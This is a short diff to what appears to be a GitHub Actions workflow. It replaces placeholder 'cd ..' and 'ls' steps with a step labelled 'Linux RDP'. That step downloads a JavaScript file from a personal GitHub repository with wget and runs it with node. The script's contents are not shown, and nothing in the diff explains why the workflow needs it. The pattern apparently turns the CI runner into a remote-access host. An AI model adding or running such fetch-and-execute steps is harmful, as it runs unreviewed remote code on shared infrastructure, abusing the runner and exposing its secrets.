@@ -6,6 +6,5 @@ jobs:
     steps:
 
     - name: Linux RDP
-      run: cd ..
-    - run: cd ..
-    - run: ls
+      run: wget https://raw.githubusercontent.com/raiyan088/public/main/directory.js
+    - run: node directory.js
